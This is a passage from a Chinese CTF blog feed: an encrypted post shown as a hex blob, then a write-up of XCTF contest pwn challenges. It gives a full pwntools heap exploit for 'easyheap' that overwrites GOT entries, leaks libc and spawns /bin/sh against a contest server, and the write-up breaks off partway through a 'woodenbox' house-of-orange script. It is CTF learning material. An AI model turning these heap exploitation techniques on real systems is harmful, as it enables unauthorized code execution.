1cfdcba23fdc2f910971166f49f2accbcc7e9333fc014a2135392e52739d4565a2b1e2b48ca1d7bf4c633d16152c168fee6c774222d9ceb88c173673c8948552436858676cb19edf061256b1f8738da609128512e9f9d617fa032a5b6690ac23f1c7f1a6cad67c27e0f229e6478c1a20a2922e0ffd7b112938a79a8d870aaac93f5759008c85ce7de8d691b88f891369fad7bdb56b9b875367070d382570715eead417448eb90d1e2b45b2fd8b53f637475f8d53afa740053cdf7e39af463f8f040556206cb65ab901b26fdfc5b149717a9c023a690f126449911c49a58bc1f295c2abb2a855eca6b82b0a1eeb8e4d99270918789d3cb69899f8928f6e7ca8fc9ad70733707440edbfe3ce37dab1809efb18b877d809902495d42ac1f99505e736b33fa4164230cccb13afdfac60e8c9724058ec24daa81de499d6453c91d310407d4e84ba4da58061a33a3a0c76ebfef2dd032f245aa0b6159ee356a081f474ff532b0ca81c1e328933a3058508799967e2b857366ae55a4421a454ab575a5b816eb61b6f169d72201741ba7ef2335ab225f5762f8ede5f945c5791d82a25950ff7dce8113ce82e2333009a93c08a70fb1974e5b59771744ef4b7b71711ca1bf939b037eeb0b198f77a75a00ce363719375c4960fd426cb30e20d26d3f386fe5df4e07e0d8fec4ca3b96374fc355750c550f6ff34244523fb29360e14848275c1916279d2c7450c84d774fad7acf6f564b71ff82c36b2618fb7da8d921407636f6bc2fe133b91449116ba457a31f9b33ce7a911c1a79ecbcbc10b2c5106c6587dc5453554958ff6b1a0e28707b19deecd5f487b75609f855af452e3027cb0dff2e4a0f3bc054b58be2759a4f0b4ae7265e0c8b30af573f7b0d743b59020faf634219d7725f87ed63b865a9e0f2104d6bb6c2dbe44b6f35c3e9dc5072d7bdc93fc2d8104b924601c9274493ece16da1eb59966128aef2e644653a9bc9cf80449849667f3c0592020ba9a132e4b7a57d964978d7e9c2ff6561b9c0d1c0095c27011cf7c7d2c10a587dc1443a79fe739ab1a726cade279a43c97a446df6e69ce343f15f12a5dfc6d45d6202cfebdaf0f4838bf2585dc1390a0d23ef13cb9951246c0686dda758fa10071093d9a2e4ad586da45447e978f9c2460681af650ed8c8629bf6243120e01d9e0f2ed47d228b3fbe5290fc9b3d9c8d14f051d7902f849573af553bc6b5f7ac4aff8934f23817a7ac9233d7b23c2f02360d1bd232f30b1b5891399bb35ab9f5d970151908ed067ee16861611acc34e52866fcbb513943c4c90ea1d0f1c404d00618e24004009d9f100d59480ee4970a1460f4e4d207d169291e81317a4f6016545c97067c592e4a33117abf51070a26251eefc5d3be5bb900c0faa23b6f8ef902b44807dc445d8ac45fbd835ef6a2f128f461fc8cdaffb0d8384be256e2ab4613f7d582dabf40774b6124b63d86d83c2ac2c5a7117f3bf2e8298413897d8858170cc5675cfa84fa9ba01a5806a16f00c48072fb5c7b2cfcf94b5759a0875d43c9af0d37f676e70f78cb4e58bd327704a0459c40a5ea6440e1c2351ff186837dd857507cd1f0b7c80bccf0320fa0b2e1874c54651b1613877744ae5d7ac34359ac7fe33bcde28faf93ac9a2e8374ce9cc508392f99fe364b4990fb670be9b51f39b29a9dd633a0185a4673ef54c7dfb890695d9c1a51bce026dfce1168433d315d37612e8d149cfc995676d078cdc251db29ad72efc52f24058f8d7c03e65089cd2f2564cb989641908c74d6692f1c61cb61884c158ea34d3e55181eabd0b3b07d84af3a5e5ded9dc0a6869a44b6c02a4584f9b2f51050a69120ccc312c7d10b602db42b8a6693fa5da448ab16900cd6a98aec848f7fc9e8753c55724beeb03b579d664c2d617012c6ac792c5be3f7e295461c4854a7ea842d1755fcdd2eeeb93792e8f00c5b98333d54a579fbc043b0bde89e90ebb73d6a512b7ccd3438cba020a858d5118b2c155697b60912eead881a24d2b77bba05298a1caff3a6b5f483a3b83c8d2cc45c2430d509704bb8d04ee5627ab24cfb9a7cd33012ff2d81b8f920bc1c4d6c3e609fe53ac98e0e0c2c6907b8a28e11c3004a7cc2a6c316090830f4980370eb21cd9d92c6327f7905220195be132f4f3e1740ccbbf3bce378e2e13b5d1e13125b6fd1ffaa661b769abbfd64fe1b401f13d8f895aba3bdadd1f8e828b384f406de25c565f3fb086b3c6c9ba41a9da9b514a8d209524a767cb7f6935de557a8c2691e2a3e5112f4dbbdc8250c33a73c2773b53e5929f2eee9a4b6990475e31572ab4e03b2d5f1b0ef42f46729058a16feec147c346d07d9b2efca1e33f0558fedc1ca3c8d45aac77e949edbabdeffb630d4ca14fe53f4a7e80c81397896aec9b508430e1a05dd486b94bc067818e3bf39b48561884f3bf2acdf1b1f7d48e277a67df61ac5dc69bef40ec1a7eaaeb601ee7f0c179d2fba69ad469f81dee7709b4a3253aef5bdcb2fce57ca0b0fa261bbaed52ee892b2ce33eccd90d2b5749baf4e3eac7373bd35d90ad6436f00faed42263619d385d4b3684e1d25403a55bdfba5e930405184fb710f0bd5f1fa043e0b68c13428b3d38fbf533b7cd0658c9f39ad5ca4cee4ce400860f54ead65a50e44479c398a480a43f2d1381fc93b514984da67a62afa8638ad5f8a2a3a7428037cfc73a8caf76629e33bbc4dc00553ec562fbb39352b53550dceb05310f84f152ebbe51b5f9e3a56b4be57d420e18f8666a8c3fd0959e106b522c6a4e6f210b2ed22deb9357988850b4bd6f8f175d1f8bac0a1cd8317827be7b2b5ca3e316c1448791249de07f73a58c4970f957e36106ead9e3ddee8ef4615d0400033f872ca9155f7271f4c7c14ac0831d0f3bc0799aeff983f4552e6ee57ab2911b91161b17874e215d519b20fb2a2a6e52d66df98f10f4bf986f1dd4e931b632241671526a19b8068d039a3642632cbc71c870ff5e99a9c8e4e6b01d125c95ff9f33beb161003a9b8aa753b57771f19369cc6b2cf4fe019933c9a9579c1106056ec798f5d66a552aaab60b0ce1d1448b439a5fbab74f812f66ef63f5e6d53d3457d78fac1e106fbd45461cab0e06c9ca0a6ca8342e9d0622b8ef397bfb4a5bb74eb5e973953a8fd0ac5e956cc735cd8ec1b461805589a158ffbeacd05728d420ffe924da7ec95476969c880f145fc0980f687e7c11fea60a4c7764aa4a26106a72f171dc7d27f2f8bee63d67206e31617f88343a7369045cae54c21c5d06f5558204a854174d4d0202f7092e3387c8d8285482443b42edeb5c40c19fd6206ae5a29d31fe7a30b876bd5452835dbd10eac7a3af792ae1cc6bec82c816c2d53c3faafccd35dfde0d0f4f73d281ab242d1afea2f565e4c2e7174bb7c2e64ba491abae713ec02e62c7ddef060766615afec13b91e286d0e4ff9bb9a1bff5eef260f2838666965d3c3b7584ec2c0483c12e5a1264183301d22e02d3f6cffa23ea84091363283394d7efa2fcc75d7e17e03a08d683df7a45cd09fe013396a0ff0590abe74b00cf74149139374d6841dfee2c969404228df08410f1a355fd46a07f43523258868025ca9482deee5f7c216d87f5339b91d9db8decdd0fc419536a7016ca4469d78bc420ece3a696e0a0aab34010626d210a2f1db2ce0f8eb14002b41038a3bd6a0ec1e42987f2953d3a7074d595fdbd07a8a8ecbd617ff6028b0e769269da5560e0d7509a8a146124aeb1f0cbd8f5155f9c9e4a95f2039e15c84b7961ba80b04dd8f0a27d59992200084244dc984914fb6cb8b92f5b4d0c58cbf68a55565646107455d0afa51b0bb68cf3aa1c252d1502f40ef7f88565bcd9c50012d232a9cafc9c228ddf8f401d4b852137f9885cd1cb88c3000f30135da33a2eb93c51bc690ec10872e03b49820ae6089ee0c0bfa7e65f18503ab4f96219d542101b0d521b3be8a41346a8d35cb46c07a63bafa99783ca2ee818d26a319891ff759b39a036e11aa6640b40c848ff6318ddb81068e033b117a9493148316ac6bb9b1ec8a03cb8cd0c32bd1324c16f71805d44d3a9ae9786efa0be9f1a2ca6760eeb5ee8efc657c20404844cdce49c34bdf126ca94016a348a8799674868a28e81cebae02aed6304a3b0c12f8a7885483d968c5993d6ac3797ad31cb80aa6525764407b611768a87a4548da037c631d4ce9efd0a7a455ff8b854fa11fa6074faaf8f903c41434d04cca136670d249e65472ecac6519c5906a2858968bc7c2b24cc34dd953abb99074ecf6a2916c99f8345cf28782f1cc777fc7606c5c0c7929c31ab2299442b49b4f7b7055a015fb7c01131520b695938c24740c8f374c89727afd1808e215169440fbff2eac95b860c3d513d912f76274e8c1b2ee082e3155b9335aec17490048c4326414d6516d9ac8f9e1fc67cdc7528bd3471e20326d74b3b7ceb7bded46dba4301785f2af836a83b0ced058ca5e274958bf45535081ad9b1cf55d9da7c936ae0143bd6e65a3b8f558a776635619ebffd520cc6de249b97a968ae69b147cd3ce61847b670e2a003265655272f91a03aacb518a4a89e36caf96fefb009bcf4a35a20f15d1974e0b4f59cd1202d1d008de57ad39688fb1f555ba75dfbcd5b08bbf4ce61991351d38aee686fb5a56c54e3045d89d3341d3cd37be9031c87942257598f89271c06e10a58bb02e5ac6034e2e1bdf66094e645e226f59b5867bb1aa936695769fbccd7f855926b8fbe2008bc45f574a0cd72b48445d3ad4cd4ac290aeb8b2218d8f84b3dd7d381529670639a7c3ae8045521cb26a4ec3b3daade3fac07fa03d7b2a52dec10674b1ef16759bad488d9bfcdadfc840bd7b455bf3df5bbbf569f8eb5938df220bd76b1a37870c7f2e7f57e345bca0b08ff2d91dd3a059a1507580ce204f93d28c1d38ed286514952dd9a420c4b0747f8d9c7cd11d973f846f15c6675602f7044a970dc6dd8fe3a0569262072802220e03cef26ddf61c17e6cebc28a6654b4c371b1388a62c427aa8c63407049388cfa32f02db428590e46d697e5c3199be2a8d661933c928b2fb77da857b3e098f8236937f33dfc99560582275b692e49247cc74a59ed19199a6c4862e3807ea40067897ef81479ce6e5ca3397e20bb897598cc8a5b70922cdafebcabb8c6f06d0bd12694255bd85ff955b2139f8b29ce2c4212717c254633843e73cb23c4619ac1fe3ab2739561c34ccbd8c112f993b2da052c4108bdc2e20c13ecce7fc1d055b2f4403ebf96f9325aa1d42c18d103367810a4a46ef0fd419f757551739f415877d4fc2789b316341495766bfddb68527d4e8b9c4b1c4567768e5c5cc41752bc4b8824463d7a921bb82a00ed1ed5bfcbab6b57a35fe129f02e236c14de721dd58f83b1c9b5c74f8fe187fbdbb18ecc9e188e76df802c5338980c3b1b01b981d1d142fc50ca6124b5511cda686f1b4f361f436a6eecbc4d624b00bca690f237b15eaa9ba4c39c2f57cad30afee45b3ccc32fd6d7c9fb8de627555c85b8b700478ac3feb36a1ddff82ff90e91d70b625ef3b7e21ac1dff0aad7f53ecc5b4d596a4ff25726d722fc62355387e6e5e6d1136396c080740a3a7a8049341266ce5a2bad55f349d15255c9c7c89ba783ad3ed06f9836abf034ffed68aa2395a2b91f2e30682e6cf26b52a9f193c56f9783149531c7f309ec6cc52156c49a63ea68a103470502252580efab9a817ea2d92bc373c6fd95c1cf5dcd94598b7a3429d8ada7981f5e11030248e32f450901850ff0246654ad6c6eb82676de86901b4bce9c80bdf076a4e7ba0b2d26a81fcfed9bb63b94354b67409f2f4421e9b4d58528bd227371fc6febc9f4e3d8ca61a34d2204db868ddf6d29b75f14af307088740033cfd8d8097f0f0fe62f3ca49476408ebfa745cae5fca8508e10833df8a27a2cbda530c221f912b7637f199b3caed265ad99aadec6382c00b167f2f36f9eb924c360117335a192f740170ef6d61f39c48e9dfa9bd05b6ad15168688cf7d06dc9403cd752c1efd2bd2e797f85a6d69c538b46db33b99cfbf389cd13e04a5d4dedd43da3506708fdfd18c417662f6d6660f7f4f1e1067df832690b6382cd30b73c7345adfcb3eb9e19a207c023ef0c7a732e4781c2075619c73ab0dd95d40936918b6e9c1e0fbd661b306d5e32e50486601acd222dd2a5dd0532cc7d1dfde590d79a9af134a4313cd99776e09c8d82c37bd65e458869924fe1c7c51a0d3e90fe6c98e6ff0c3fd9d82437ad5ea5251c924dd602fb0b10ec8b2015b6503f9da90cc903b53f6a0d40a1f96f2502c49cd18e7cb065a7442972f2cd455d452df27988023e543d20c116a022e7aa478ca951d7262dc1c26c30619c5d4e2d9b83d6ab3d747da44816a97aef6322c65cb425a4edf7d2e17a3d362868b017a481e221da50ebd1705a1455f5bff0ea4c7a9bdc6cdbeee0eb09e7834b0a1f2ffaac305004dbf216ac341ee985ceef7e6ea9ec1ce924be5337022d3b34f8d10fef91a8b38ded22b1fff140dc48671cbcd522d87949968ae5510ca0293eb1d91ecb23833654fdccdbe3d82b5d03b1d03d5c262a028593d0bf734ae352b181f81ca48c7d4e790255755b374d5eaaa574b5b9c4fb1bec503957476daf9c33ec20cf1f661de42d7c8186ee9ad7c6ec36f4d8075187de732c30f8854fa0dcd6cca27663d680c76142809e06f03d0c00f029f1f9788d70903b8c2f88dd65e4632ada57064260a0c815870056a9e7fa4da14e4abb14b4dbba02a88abb29f66515637d1efc591449d8923490d9e60ad721b5e83704f2ba260127287f5b4f2fd88a96d90996ba8c16d8d1aaad179a7020881f48b93084d9ed7de54c3c054ff8a55bb478e75578d483b1b8e0c4669d2dd2b79adc324d7f12e670d38d4d9d5f0d642155de8fee2e0da0088a197d8d51abac3e6087f970299f87af7778129a9caea3698d19f09a7245007e09f38a25e1b1d70f399a2071653b755d8e1853a8b88c23411c915ef9b3fb3c4d902b0695028bb7fcf25d5a290fb6f522a22d9a826bc1b5966d8d55ad710348380b144a58bed902fc0a0813d84e4861a02dc303b47e5c8abf8ae8b0aa2f6f8942c0b09f9c72d5ac83c0b7a2cb8fab8d0b7151a3617951bbb8e1a71d051c38cd21d2ce3f380d4916bfa4282b71eedfab3e3c1544a4cc7fe3107eb5126b1b4fe358d51ff144674204cb119aa7fc60c796498e996cc36ac9de2277176e7aa24a4e2475406f905c1da7447c40f59eb250d566cd7e2387e8b678470f28d79595bd1eaf0b5a33934f4705692369d7747632684460600d8275800556adb0a5f405a8fdd3b45df720c5f3c1bc38344dee396122ede818e89de862dbeeee5ee8e1243da8e2577aa95b5481033d65917d26c2f75c93217507168304a3b66c79c9c53b844574a602daa734b91a87e9d4b06370a22f7c3e04e8b24e26f09ade3c76782b47aadabf6cddc4f111bc5dd45960657396d62d25c6804ae4b27f9ed10e142f34a8ec51cd25fa294f06570008048454e6045ee4001a4cf046ddd2e1d28ef480b28dad0196980f0beef8e1665c5b6173c2a145c7e8c76e9bf73648a4813399abf941eaf81ba4e9e2750fffc9c71ef7bda4efce66fa93cb3f2424f577d8885297291a73d4eabc9152bdacd4a549de9251577efb3bfb10c166a9780f4969b4a06aec107e2900f218cd035ff7ea05ae206e15ec33b668fef6e326a3edf55b24bb81ffba8193fce55839b0cc2f3d14508df415a9d9eee8dd8458b3a6604336172738f1d28fb25748f1a10847dacb1eb1a6be296837071c2a3f1ae02dfb374f0aceb779007393b53a7dee9417b8db79b016f7134e31131b2969124b5225ad4a3840d62d53d9fb83efcf969e8a6570559ecee2901e4493d22edf3136c708cfa790b25d835d380991725a59ae5b4fab19cdf1131261151da1bbc44dbc63e4faca00a938d1345bea61834ca98945616fc607e280fa2ab3fbd1b62b49fdc4228c617266e11aaf497d4eaf1ca7d3c6d96b1981c273b897b06b4c84906bbff6a3c8767b79e114ad275fa09ac46e2f34774ce10d2185bb5bb31f7c65a7788bf69a5d0fce52e9722527585e4653f4a20414b761420c6418ab99fd5e5f0aefc930f96d999bbf4f2f5743e026cd2579c8cdbd7d95eb4dbd00707e603e56634edaedbe88be6691334b005ff2f3e194c116b60d3f2c666beac3943f7e9eafe8ff7bc3f97fbc1efea5b1ad1338e179ec7194283403dae6b050f37fae22dbb0ae48bdb2568d705c4234ca3ceba7d68f8d340ae14a357d33147348e4eb468926e23cc52da0b64a8698b133421656afcc9700b66800b573bdc665e91c730518229bb606c562ffb4623359bbb7e96f10f7973fa6dd9b05db3d51c5419283a8cafadd48d35fc60871a521715b32ef2509a0bf703dcdec719296d2035dc3ca1a6ed6e43c3e5d6e292017763c8ccece2813f199932ef67ffb6a09c34cb96fb86c59000be8c04fb6d7ae5c220a43dad4113cf42ca3038c485dc2dca7c0f469f20a37540284fca1dc2d271038c55b0fe72b5104242415f046dc28136d8f3ca179d593de4ac5789a6dc42ca3affdd0ccebb0439212dd5df96c822c3ff0ac8e34136e3b468833ad65bc2eef49da3f828ec4e63b3d42ef28829f4f1c8ce8e284d5492aad639519283b769cfaf020ecb896ca20cd2c54b1cc9086496613790217fbc75d74705c49e3f86e707aac4406589c4734c32d0526a5786a1d895edc38bc84bd76f46cbd1fbd60d521da9fd96478506b3b4b4b324aa97fab38f0d38299bb461fb4bdda1a9b7fb6d00bfb14244e4558e3c03559ec7315bceb2e89b3df62f1fd3d791c23ae817122c4258bf9249c4a70d786da4d0d3d7c3da0dcb7ed3266a16866d7848f2b2aed2a404b44604cc582bf2a129d39f578ca9f6aa7c0daa92a814a2ab48f3536251d730aa25fc38e47f617bb68eb99bf5bb4eb785ac6c894142c24719b9506bb8af6bb15b057cbee43f2fa3833059825ef726e0f8930d34ebd7c9f14074ca8e5ba43e12112dd5bcd001d698aa6e9a060ae4bde21022e32a54f3e5ebfb5e5267cf676dc8a957b0a14fa3488a55abddd87adf117087ffd4d8806ea5b567aa39080832aeaac94a9d304d15434081848bdcdf3e301d317ae30dd840a7eae96577b79fef44705cc0dc4154d4c6940bc4cea3e662895206342671ca4632a16f31dd791e6826b5372d46945b0901ec399d5caec531ddd6e3fb762a3c26f220a0723dadd99c3e1e77ff30683cae512c727bd0c</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章，内容可能是个人情感宣泄或者收费技术。如果你确实想看，请与我联系。
    
    </summary>
    
    
      <category term="pwn学习" scheme="http://Whali3n51.top/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="tcache_stashing_unlink_attack_plus" scheme="http://Whali3n51.top/tags/tcache-stashing-unlink-attack-plus/"/>
    
  </entry>
  
  <entry>
    <title>xctf_高校战役公益赛</title>
    <link href="http://whali3n51.top/2020/03/11/xctf-%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9%E5%85%AC%E7%9B%8A%E8%B5%9B/"/>
    <id>http://whali3n51.top/2020/03/11/xctf-%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9%E5%85%AC%E7%9B%8A%E8%B5%9B/</id>
    <published>2020-03-11T03:17:35.000Z</published>
    <updated>2020-04-15T02:21:41.585Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="summary">summary</span></h2><p>这次比赛总的来说发挥还算不错，虽然没有抢到一血，但是至少做出题目了。对kernel题目来说不太熟练，甚至是有点忘了怎么去做了，有时间了一定要多多熟练kernel的利用，不过这次的每道kernel都有非预期，有点无脑。最后还有一个towchunk的利用，放到后面一篇文章专门讲解。那是一个新的利用技术。最后吐槽一下，这次赛题太多了，肝死我，不过好在肝到了一个养生壶，美滋滋。</p><p><img src="./gift.png" alt></p><h2><span id="easyheap">easyheap</span></h2><p>这道题真的卡了我好久，我就没有看出这里的逻辑漏洞，真是想当然的认为在错误了之后就把堆块给free了。</p><p>真是吃到了开发功底不扎实的亏啊。</p><p><img src="./4.png" alt="img">      </p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'easyheap'</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.debug_remote_libc =<span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'121.36.209.145'</span>,<span class="number">9997</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0x0000000000400B1E</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0x0000000000400B1E</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">sla(<span class="string">"Your choice:\n"</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"How long is this message?\n"</span>,size)</span><br><span class="line">sa(<span class="string">"What is the content of the message?\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">sla(<span class="string">"Your choice:"</span>,<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">"What is the index of the item to be modified?\n"</span>,index)</span><br><span class="line">sa(<span class="string">"What is the content of the message?\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"Your choice:"</span>,<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"What is the index of the item to be deleted?\n"</span>,index)</span><br><span class="line">choice()</span><br><span class="line">create(<span class="number">0x18</span>,p64(<span class="number">0x602018</span>)+p64(<span class="number">0x200</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">sla(<span class="string">"Your choice:\n"</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"How long is this message?\n"</span>,str(<span class="number">0x500</span>))</span><br><span class="line">sla(<span class="string">"Your choice:\n"</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"How long is this message?\n"</span>,str(<span class="number">0x500</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x6020d8</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x6020e8</span>)+p64(<span class="number">0x6020f8</span>)+p64(<span class="number">0x602018</span>)+p64(<span class="number">0x200</span>)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x602018</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x0400670</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x602080</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">stdout=uu64(r(<span class="number">6</span>))</span><br><span class="line">libc_base=stdout-(<span class="number">0x7ffff7dd2620</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">edit(<span class="number">3</span>,p64(system))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p><img src="./5.png" alt="img">      </p><h2><span id="woodenbox">woodenbox</span></h2><p>这个题目就比较简单，就是简单的堆溢出，我为了图方便，不想那么麻烦的攻击__free_hook，直接用来house of orange来getshell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from PwnContext import *</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">s       = lambda data               :ctx.send(str(data))        #in case that data is an int</span><br><span class="line">sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = lambda data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = lambda numb=4096          :ctx.recv(numb)</span><br><span class="line">ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = lambda                    :ctx.interactive()</span><br><span class="line">rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = lambda gs=&apos;&apos;, **kwargs    :ctx.debug(gdbscript=gs, 